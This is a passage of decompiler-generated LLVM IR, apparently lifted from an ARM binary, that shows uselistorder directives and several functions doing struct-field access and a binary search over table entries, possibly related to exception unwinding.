  uselistorder i32 254, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32)* @function_12a68, { 10, 9, 8, 7, 6, 5, 4, 3, 20, 19, 18, 17, 16, 15, 14, 13, 1, 0, 12, 2, 11 }
  uselistorder i32 ()* @function_1296c, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 21, 20, 19, 18, 17, 16, 15, 14, 13, 3, 2, 1, 0 }
  uselistorder i32 65536, { 4, 3, 183, 6, 7, 5, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 179, 39, 40, 38, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 80, 72, 81, 73, 82, 74, 83, 75, 84, 76, 85, 77, 86, 78, 87, 79, 88, 89, 90, 91, 93, 92, 94, 95, 96, 97, 98, 99, 101, 100, 103, 102, 104, 105, 106, 1, 107, 0, 2, 108, 109, 110, 111, 114, 112, 113, 115, 180, 181, 117, 118, 116, 119, 120, 121, 122, 123, 124, 178, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 146, 145, 144, 147, 148, 149, 152, 151, 150, 182, 154, 153, 156, 155, 157, 158, 159, 161, 162, 163, 160, 165, 166, 167, 164, 168, 170, 171, 172, 169, 174, 175, 176, 173, 177 }
  uselistorder i32 36, { 2, 3, 0, 7, 8, 6, 1, 9, 4, 10, 5, 11 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 36) to i32*), { 1, 2, 0, 4, 5, 3 }
  uselistorder i32* @ip, { 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 13, 14, 15, 16, 17, 18, 19, 39, 20, 21, 40, 0, 41, 42, 24, 25, 23, 43, 44, 45, 46, 47, 84, 85, 86, 87, 22, 48, 26, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 9, 49, 10, 50, 51, 5, 1, 6, 52, 53, 3, 54, 4, 7, 55, 8, 56, 75, 76, 11, 77, 78, 79, 80, 81, 82, 83, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 2, 27, 28, 12, 71, 72, 73, 74 }
  uselistorder i32 16777215, { 0, 7, 2, 6, 1, 8, 4, 11, 5, 9, 3, 10 }
  uselistorder i32 16777214, { 1, 0, 2, 5, 3, 4, 6 }
  uselistorder i32* @r2, { 87, 1, 10, 5, 88, 11, 7, 12, 13, 89, 90, 91, 122, 92, 38, 39, 40, 41, 43, 44, 2, 45, 46, 42, 14, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 47, 64, 123, 48, 124, 15, 176, 177, 178, 179, 180, 181, 106, 49, 125, 126, 127, 128, 129, 130, 131, 57, 107, 132, 50, 133, 51, 108, 109, 110, 111, 138, 139, 140, 141, 142, 134, 135, 136, 137, 143, 3, 144, 145, 146, 147, 148, 65, 66, 67, 149, 151, 150, 152, 153, 154, 155, 156, 157, 158, 112, 159, 160, 161, 162, 163, 164, 165, 166, 167, 31, 32, 33, 34, 35, 36, 37, 113, 16, 17, 18, 29, 30, 4, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 114, 115, 116, 117, 53, 54, 52, 55, 56, 58, 59, 60, 61, 62, 63, 6, 68, 69, 70, 71, 72, 73, 74, 0, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 8, 118, 119, 120, 121, 168, 169, 170, 171, 172, 173, 174, 175, 9 }
  uselistorder i32* @r1, { 69, 70, 71, 72, 73, 74, 75, 76, 77, 0, 78, 79, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 4, 80, 81, 42, 19, 82, 87, 8, 83, 43, 94, 95, 84, 85, 86, 96, 6, 7, 97, 5, 98, 99, 100, 2, 101, 35, 36, 37, 38, 39, 40, 41, 20, 21, 22, 33, 34, 3, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 88, 89, 90, 93, 44, 45, 46, 47, 48, 91, 92, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125 }
  uselistorder i32* @r3, { 5, 34, 35, 6, 13, 4, 14, 11, 36, 38, 15, 16, 39, 20, 21, 2, 22, 24, 23, 17, 37, 117, 25, 29, 40, 41, 18, 42, 86, 87, 88, 89, 90, 91, 8, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 0, 109, 110, 111, 7, 112, 113, 114, 115, 116, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 26, 54, 55, 10, 56, 57, 58, 59, 60, 68, 69, 70, 71, 72, 61, 62, 63, 64, 66, 67, 65, 73, 74, 3, 75, 76, 77, 12, 78, 79, 80, 1, 81, 82, 9, 83, 19, 84, 27, 28, 30, 31, 32, 33, 85 }
  uselistorder label %.thread67, { 1, 0 }
  uselistorder label %.thread62, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread61, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
  uselistorder label %dec_label_pc_18190, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %bb133, { 1, 0 }
  uselistorder label %dec_label_pc_1812c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1806c, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %bb124, { 1, 0 }
  uselistorder label %bb122, { 3, 2, 1, 0 }
  uselistorder label %.thread59, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_17fa0, { 1, 0 }
  uselistorder label %dec_label_pc_17f94, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17f4c, { 2, 1, 3, 0 }
  uselistorder label %bb118, { 1, 0, 3, 2 }
  uselistorder label %bb116, { 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_17e9c, { 1, 0 }
  uselistorder label %dec_label_pc_17e70, { 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_17e68, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_17e54, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %bb97, { 3, 2, 1, 0 }
  uselistorder label %.thread57, { 3, 1, 2, 0 }
  uselistorder label %bb92, { 0, 1, 3, 2 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
}

define i32 @function_18214(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_18214:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_18214 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18214, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_18214
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_18214, %bb
  %v0_18218 = load i32, i32* %r1.global-to-local, align 4
  %v2_18218 = icmp eq i32 %v0_18218, 0
  br i1 %v2_18218, label %dec_label_pc_18220, label %dec_label_pc_18250

dec_label_pc_18220:                               ; preds = %bb8
  %tmp = icmp ult i32 %arg3, 16
  br i1 %tmp, label %bb9, label %.thread2

bb9:                                              ; preds = %dec_label_pc_18220
  %v6_18224 = icmp eq i32 %arg4, 0
  br i1 %v6_18224, label %dec_label_pc_18234, label %bb10

.thread2:                                         ; preds = %dec_label_pc_18220
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1825c

bb10:                                             ; preds = %bb9
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1825c

dec_label_pc_18234:                               ; preds = %bb9
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18234 = mul i32 %arg3, 4
  %v1_18238 = load i32, i32* %r0.global-to-local, align 4
  %v2_18238 = add i32 %v1_18238, %v3_18234
  %v1_1823c = add i32 %v2_18238, 4
  %v2_1823c = inttoptr i32 %v1_1823c to i32*
  %v3_1823c = load i32, i32* %v2_1823c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_1823c, i32* %arg5, align 4
  ret i32 0

dec_label_pc_18250:                               ; preds = %bb8
  %tmp13 = icmp ult i32 %v0_18218, 5
  br i1 %tmp13, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_18250
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_18250, %bb11
  %v0_18258 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp13, i32 %v0_18258)
  br label %dec_label_pc_1825c

dec_label_pc_1825c:                               ; preds = %bb10, %.thread2, %bb12
  store i32 2, i32* %r0.global-to-local, align 4
  ret i32 2

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_1825c, { 2, 0, 1 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_18264(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_18264:
  %v2_18264 = icmp eq i32 %arg2, 0
  br i1 %v2_18264, label %dec_label_pc_1826c, label %dec_label_pc_1829c

dec_label_pc_1826c:                               ; preds = %dec_label_pc_18264
  %tmp = icmp ult i32 %arg3, 16
  br i1 %tmp, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1826c
  %v6_18270 = icmp eq i32 %arg4, 0
  br i1 %v6_18270, label %dec_label_pc_18280, label %bb8

.thread2:                                         ; preds = %dec_label_pc_1826c
  br label %dec_label_pc_182a8

bb8:                                              ; preds = %bb
  br label %dec_label_pc_182a8

dec_label_pc_18280:                               ; preds = %bb
  %v3_18284 = mul i32 %arg3, 4
  %v2_18288 = load i32, i32* %arg5, align 4
  %v2_1828c = add i32 %v3_18284, %arg1
  %v2_18294 = add i32 %v2_1828c, 4
  %v3_18294 = inttoptr i32 %v2_18294 to i32*
  store i32 %v2_18288, i32* %v3_18294, align 4
  ret i32 0

dec_label_pc_1829c:                               ; preds = %dec_label_pc_18264
  %tmp11 = icmp ult i32 %arg2, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1829c
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1829c, %bb9
  %v0_182a4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_182a4)
  br label %dec_label_pc_182a8

dec_label_pc_182a8:                               ; preds = %bb8, %.thread2, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32* @lr, { 4, 5, 61, 62, 63, 64, 65, 6, 7, 8, 9, 10, 89, 11, 12, 13, 14, 15, 18, 19, 20, 90, 91, 92, 164, 165, 16, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 0, 3, 103, 104, 105, 106, 161, 162, 163, 107, 108, 109, 87, 88, 110, 111, 112, 113, 114, 115, 116, 117, 69, 70, 118, 119, 166, 167, 120, 121, 122, 123, 84, 124, 71, 17, 72, 73, 74, 75, 1, 79, 80, 81, 82, 83, 76, 77, 78, 24, 25, 26, 27, 28, 29, 30, 32, 31, 2, 33, 34, 35, 36, 21, 22, 23, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 125, 126, 127, 66, 67, 68, 85, 86, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 168 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_182a8, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_182b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_182b0:
  %v1_182b0 = add i32 %arg1, 68
  %v2_182b0 = inttoptr i32 %v1_182b0 to i32*
  %v3_182b0 = load i32, i32* %v2_182b0, align 4
  ret i32 %v3_182b0
}

define i32 @function_182bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_182bc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_182c0 = add i32 %arg1, 8
  %v2_182c0 = inttoptr i32 %v1_182c0 to i32*
  %v3_182c0 = load i32, i32* %v2_182c0, align 4
  %v2_182c4 = icmp eq i32 %v3_182c0, 0
  br i1 %v2_182c4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_182bc
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_182bc, %bb
  %v2_182d8 = xor i1 %v2_182c4, true
  call void @__pseudo_cond_branch(i1 %v2_182d8, i32 %v3_182c0)
  %v1_182e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_182e4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 0, 1, 2, 18, 3, 4, 5, 6, 7, 12, 19, 20, 21, 22, 23, 24, 15, 25, 13, 14, 8, 9, 10, 11, 16, 17, 26, 27, 28, 29 }
  uselistorder i1 true, { 0, 5, 6, 1, 2, 13, 14, 9, 10, 11, 3, 4, 12, 15, 16, 17, 18, 7, 8, 23, 24, 31, 32, 27, 28, 29, 19, 20, 30, 33, 34, 35, 21, 22, 25, 26, 36, 37, 38, 39, 40, 41, 42, 43, 44, 48, 45, 46, 49, 47, 50, 51, 52, 53, 54, 55, 56, 155, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 120, 75, 76, 77, 78, 79, 127, 126, 80, 156, 157, 146, 158, 159, 83, 160, 84, 85, 137, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 81, 82, 171, 172, 173, 118, 121, 145, 144, 96, 97, 98, 174, 99, 100, 128, 129, 139, 130, 140, 124, 138, 175, 125, 143, 176, 86, 177, 87, 88, 89, 178, 147, 148, 90, 91, 179, 149, 150, 92, 93, 180, 151, 152, 94, 95, 123, 181, 182, 141, 183, 101, 131, 102, 103, 132, 133, 134, 122, 104, 105, 106, 107, 108, 184, 185, 186, 187, 135, 188, 189, 190, 191, 192, 193, 113, 114, 194, 115, 116, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 112, 211, 212, 213, 214, 215, 216, 111, 217, 119, 136, 142, 117, 218, 109, 110, 154, 219, 153 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_182e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_182e8:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_182f0 = call i32 @function_19764()
  %v0_182fc = call i32 @function_19764()
  %v3_18300 = load i32, i32* @r4, align 4
  store i32 %v3_18300, i32* %stack_var_-48, align 4
  %v6_18300 = load i32, i32* @r5, align 4
  %v9_18300 = load i32, i32* @r6, align 4
  %v12_18300 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32* %r5.global-to-local, align 4
  %v4_18310 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 32) to i32*), align 4
  %v2_18314 = icmp eq i32 %v4_18310, 0
  store i32 %v0_182fc, i32* %r6.global-to-local, align 4
  %v1_18320 = add i32 %arg2, -2
  store i32 %v1_18320, i32* %r4.global-to-local, align 4
  br i1 %v2_18314, label %dec_label_pc_18358, label %dec_label_pc_18328

dec_label_pc_18328:                               ; preds = %dec_label_pc_182e8
  call void @__pseudo_branch(i32 %v4_18310)
  %v2_18338 = icmp eq i32 %v1_18320, 0
  br i1 %v2_18338, label %.thread, label %dec_label_pc_18378thread-pre-split

.thread:                                          ; preds = %dec_label_pc_18328
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_18340 = load i32, i32* %r6.global-to-local, align 4
  %v3_18340 = add i32 %v2_18340, 16
  %v4_18340 = inttoptr i32 %v3_18340 to i32*
  store i32 0, i32* %v4_18340, align 4
  br label %dec_label_pc_18348

dec_label_pc_18348:                               ; preds = %.thread, %.thread10, %dec_label_pc_184f0, %dec_label_pc_184dc, %dec_label_pc_184b8, %dec_label_pc_18490, %dec_label_pc_18390
  %v0_18348 = load i32, i32* %r2.global-to-local, align 4
  %v2_18350 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_18350, i32* %r4.global-to-local, align 4
  store i32 %v6_18300, i32* %r5.global-to-local, align 4
  store i32 %v9_18300, i32* %r6.global-to-local, align 4
  store i32 %v12_18300, i32* %r7.global-to-local, align 4
  ret i32 %v0_18348

dec_label_pc_18358:                               ; preds = %dec_label_pc_182e8
  store i32 12, i32* %r2.global-to-local, align 4
  %v4_18360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 12) to i32*), align 4
  %v4_18364 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 24) to i32*), align 4
  store i32 %v4_18364, i32* %r2.global-to-local, align 4
  %v2_18368 = sub i32 %v4_18360, %v4_18364
  %v3_1836c = sdiv i32 %v2_18368, 8
  store i32 %v3_1836c, i32* %stack_var_-52, align 4
  br label %dec_label_pc_18378

dec_label_pc_18378thread-pre-split:               ; preds = %dec_label_pc_18328
  %v3_18378.pr = load i32, i32* %stack_var_-52, align 4
  br label %dec_label_pc_18378

dec_label_pc_18378:                               ; preds = %dec_label_pc_18378thread-pre-split, %dec_label_pc_18358
  %v0_183bc.pre = phi i32 [ %v1_18320, %dec_label_pc_18378thread-pre-split ], [ %v4_18364, %dec_label_pc_18358 ]
  %v1_18380 = phi i32 [ %v3_18378.pr, %dec_label_pc_18378thread-pre-split ], [ %v3_1836c, %dec_label_pc_18358 ]
  %v2_1837c = icmp eq i32 %v1_18380, 0
  br i1 %v2_1837c, label %dec_label_pc_18390, label %dec_label_pc_183ac.preheader

dec_label_pc_183ac.preheader:                     ; preds = %dec_label_pc_18378
  %v2_18380 = add i32 %v1_18380, -1
  %v1_183dc = add i32 %v0_183bc.pre, 8
  br label %dec_label_pc_183ac.outer

dec_label_pc_18390.loopexit:                      ; preds = %dec_label_pc_18408
  br label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %dec_label_pc_18390.loopexit, %dec_label_pc_18378, %dec_label_pc_184d4
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_18398 = load i32, i32* %r6.global-to-local, align 4
  %v2_18398 = add i32 %v1_18398, 16
  %v3_18398 = inttoptr i32 %v2_18398 to i32*
  store i32 0, i32* %v3_18398, align 4
  br label %dec_label_pc_18348

dec_label_pc_183a0:                               ; preds = %dec_label_pc_183fc
  %v3_183a0 = icmp ult i32 %storemerge40, %v0_18400
  br i1 %v3_183a0, label %dec_label_pc_183a8, label %dec_label_pc_18418

dec_label_pc_183a8:                               ; preds = %dec_label_pc_183a0
  %v1_183a8 = add nsw i32 %v3_183b4, 1
  br label %dec_label_pc_183ac.outer

dec_label_pc_183ac.outer:                         ; preds = %dec_label_pc_183a8, %dec_label_pc_183ac.preheader
  %v1_18408.ph = phi i32 [ %v1_183a8, %dec_label_pc_183a8 ], [ 0, %dec_label_pc_183ac.preheader ]
  %v0_183ac.ph = phi i32 [ %v0_183ac, %dec_label_pc_183a8 ], [ %v2_18380, %dec_label_pc_183ac.preheader ]
  br label %dec_label_pc_183ac

dec_label_pc_183ac:                               ; preds = %dec_label_pc_183ac.outer, %dec_label_pc_18410
  %v0_183ac = phi i32 [ %v1_18410, %dec_label_pc_18410 ], [ %v0_183ac.ph, %dec_label_pc_183ac.outer ]
  %v2_183ac = add i32 %v0_183ac, %v1_18408.ph
  %tmp = icmp slt i32 %v2_183ac, 0
  %v4_183b0 = zext i1 %tmp to i32
  %v5_183b0 = add i32 %v4_183b0, %v2_183ac
  %v3_183b4 = sdiv i32 %v5_183b0, 2
  %v3_183b8 = mul i32 %v3_183b4, 8
  %v2_183bc = add i32 %v3_183b8, %v0_183bc.pre
  %v3_183bc = inttoptr i32 %v2_183bc to i32*
  %v4_183bc = load i32, i32* %v3_183bc, align 4
  %v1_183c0 = and i32 %v4_183bc, 1073741824
  %v2_183c0 = icmp eq i32 %v1_183c0, 0
  %v2_183c4 = or i32 %v4_183bc, -2147483648
  %tmp82 = bitcast i32 %v4_183bc to float
  %tmp83 = call float @fabsf(float %tmp82)
  %v2_183c8 = bitcast float %tmp83 to i32
  %storemerge = select i1 %v2_183c0, i32 %v2_183c8, i32 %v2_183c4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_183cc = icmp eq i32 %v2_18380, %v3_183b4
  store i32 %v2_183bc, i32* %r7.global-to-local, align 4
  br i1 %v9_183cc, label %dec_label_pc_183fc, label %dec_label_pc_183dc

dec_label_pc_183dc:                               ; preds = %dec_label_pc_183ac
  %v2_183e0 = add i32 %v3_183b8, %v1_183dc
  %v3_183e0 = inttoptr i32 %v2_183e0 to i32*
  %v4_183e0 = load i32, i32* %v3_183e0, align 4
  %v1_183e8 = and i32 %v4_183e0, 1073741824
  %v2_183e8 = icmp eq i32 %v1_183e8, 0
  %v2_183ec = or i32 %v4_183e0, -2147483648
  %tmp84 = bitcast i32 %v4_183e0 to float
  %tmp85 = call float @fabsf(float %tmp84)
  %v2_183f0 = bitcast float %tmp85 to i32
  %storemerge39 = select i1 %v2_183e8, i32 %v2_183f0, i32 %v2_183ec
  %v1_183f4 = add i32 %v2_183e0, -1
  %v2_183f8 = add i32 %storemerge39, %v1_183f4
  br label %dec_label_pc_183fc

dec_label_pc_183fc:                               ; preds = %dec_label_pc_183ac, %dec_label_pc_183dc
  %storemerge40 = phi i32 [ %v2_183f8, %dec_label_pc_183dc ], [ -1, %dec_label_pc_183ac ]
  %v2_183fc = add i32 %storemerge, %v2_183bc
  %v0_18400 = load i32, i32* %r4.global-to-local, align 4
  %v3_18400 = icmp ult i32 %v0_18400, %v2_183fc
  br i1 %v3_18400, label %dec_label_pc_18408, label %dec_label_pc_183a0

dec_label_pc_18408:                               ; preds = %dec_label_pc_183fc
  %v9_18408 = icmp eq i32 %v3_183b4, %v1_18408.ph
  br i1 %v9_18408, label %dec_label_pc_18390.loopexit, label %dec_label_pc_18410

dec_label_pc_18410:                               ; preds = %dec_label_pc_18408
  %v1_18410 = add nsw i32 %v3_183b4, -1
  br label %dec_label_pc_183ac

dec_label_pc_18418:                               ; preds = %dec_label_pc_183a0
  %v2_18418 = load i32, i32* %v3_183bc, align 4
  %v1_1841c = and i32 %v2_18418, 1073741824
  %v2_1841c = icmp eq i32 %v1_1841c, 0
  %v2_18420 = or i32 %v2_18418, -2147483648
  %tmp86 = bitcast i32 %v2_18418 to float
  %tmp87 = call float @fabsf(float %tmp86)
  %v2_18424 = bitcast float %tmp87 to i32
  %v0_18428 = select i1 %v2_1841c, i32 %v2_18424, i32 %v2_18420
  %v2_18428 = add i32 %v0_18428, %v2_183bc
  %v1_1842c = load i32, i32* %r6.global-to-local, align 4
  %v2_1842c = add i32 %v1_1842c, 72
  %v3_1842c = inttoptr i32 %v2_1842c to i32*
  store i32 %v2_18428, i32* %v3_1842c, align 4
  %v0_18430 = load i32, i32* %r7.global-to-local, align 4
  %v1_18430 = add i32 %v0_18430, 4
  %v2_18430 = inttoptr i32 %v1_18430 to i32*
  %v3_18430 = load i32, i32* %v2_18430, align 4
  %v7_18434 = icmp eq i32 %v3_18430, 1
  br i1 %v7_18434, label %.thread10, label %dec_label_pc_18448

.thread10:                                        ; preds = %dec_label_pc_18418
  %v1_18434 = add i32 %v3_18430, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_18440 = load i32, i32* %r6.global-to-local, align 4
  %v3_18440 = add i32 %v2_18440, 16
  %v4_18440 = inttoptr i32 %v3_18440 to i32*
  store i32 %v1_18434, i32* %v4_18440, align 4
  br label %dec_label_pc_18348

dec_label_pc_18448:                               ; preds = %dec_label_pc_18418
  %v1_18448 = icmp slt i32 %v3_18430, 0
  br i1 %v1_18448, label %.thread38, label %dec_label_pc_18460

.thread38:                                        ; preds = %dec_label_pc_18448
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_18454 = load i32, i32* %r6.global-to-local, align 4
  %v5_18454 = add i32 %v4_18454, 76
  %v6_18454 = inttoptr i32 %v5_18454 to i32*
  store i32 %v1_18430, i32* %v6_18454, align 4
  %v3_18458 = load i32, i32* %r2.global-to-local, align 4
  %v4_18458 = load i32, i32* %r6.global-to-local, align 4
  %v5_18458 = add i32 %v4_18458, 80
  %v6_18458 = inttoptr i32 %v5_18458 to i32*
  store i32 %v3_18458, i32* %v6_18458, align 4
  br label %dec_label_pc_18480

dec_label_pc_18460:                               ; preds = %dec_label_pc_18448
  %v1_18460 = and i32 %v3_18430, 1073741824
  %v2_18460 = icmp eq i32 %v1_18460, 0
  %v2_18464 = or i32 %v3_18430, -2147483648
  %tmp88 = bitcast i32 %v3_18430 to float
  %tmp89 = call float @fabsf(float %tmp88)
  %v2_18468 = bitcast float %tmp89 to i32
  %storemerge42 = select i1 %v2_18460, i32 %v2_18468, i32 %v2_18464
  %v1_1846c = add i32 %storemerge42, 4
  %v2_18470 = add i32 %v1_1846c, %v0_18430
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_18478 = load i32, i32* %r6.global-to-local, align 4
  %v2_18478 = add i32 %v1_18478, 76
  %v3_18478 = inttoptr i32 %v2_18478 to i32*
  store i32 %v2_18470, i32* %v3_18478, align 4
  %v0_1847c = load i32, i32* %r2.global-to-local, align 4
  %v1_1847c = load i32, i32* %r6.global-to-local, align 4
  %v2_1847c = add i32 %v1_1847c, 80
  %v3_1847c = inttoptr i32 %v2_1847c to i32*
  store i32 %v0_1847c, i32* %v3_1847c, align 4
  br label %dec_label_pc_18480

dec_label_pc_18480:                               ; preds = %.thread38, %dec_label_pc_18460
  %v0_18480 = load i32, i32* %r6.global-to-local, align 4
  %v1_18480 = add i32 %v0_18480, 76
  %v2_18480 = inttoptr i32 %v1_18480 to i32*
  %v3_18480 = load i32, i32* %v2_18480, align 4
  store i32 %v3_18480, i32* %r2.global-to-local, align 4
  %v1_18484 = inttoptr i32 %v3_18480 to i32*
  %v2_18484 = load i32, i32* %v1_18484, align 4
  %v1_18488 = icmp slt i32 %v2_18484, 0
  br i1 %v1_18488, label %dec_label_pc_184ac, label %dec_label_pc_18490

dec_label_pc_18490:                               ; preds = %dec_label_pc_18480
  %v1_18490 = and i32 %v2_18484, 1073741824
  %v2_18490 = icmp eq i32 %v1_18490, 0
  %v2_18494 = or i32 %v2_18484, -2147483648
  %tmp90 = bitcast i32 %v2_18484 to float
  %tmp91 = call float @fabsf(float %tmp90)
  %v2_18498 = bitcast float %tmp91 to i32
  %v0_1849c = select i1 %v2_18490, i32 %v2_18498, i32 %v2_18494
  %v2_1849c = add i32 %v0_1849c, %v3_18480
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_184a4 = add i32 %v0_18480, 16
  %v3_184a4 = inttoptr i32 %v2_184a4 to i32*
  store i32 %v2_1849c, i32* %v3_184a4, align 4
  br label %dec_label_pc_18348

dec_label_pc_184ac:                               ; preds = %dec_label_pc_18480
  %v3_184ac = udiv i32 %v2_18484, 16777216
  %v1_184b0 = urem i32 %v3_184ac, 16
  %v2_184b0 = icmp eq i32 %v1_184b0, 0
  br i1 %v2_184b0, label %dec_label_pc_184b8, label %dec_label_pc_184cc

dec_label_pc_184b8:                               ; preds = %dec_label_pc_184ac
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_184c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_184c0 = add i32 %v0_184c0, -37952
  %v2_184c4 = add i32 %v0_18480, 16
  %v3_184c4 = inttoptr i32 %v2_184c4 to i32*
  store i32 %v2_184c0, i32* %v3_184c4, align 4
  br label %dec_label_pc_18348

dec_label_pc_184cc:                               ; preds = %dec_label_pc_184ac
  %v7_184cc = icmp eq i32 %v1_184b0, 1
  br i1 %v7_184cc, label %dec_label_pc_184f0, label %dec_label_pc_184d4

dec_label_pc_184d4:                               ; preds = %dec_label_pc_184cc
  %v7_184d4 = icmp eq i32 %v1_184b0, 2
  br i1 %v7_184d4, label %dec_label_pc_184dc, label %dec_label_pc_18390

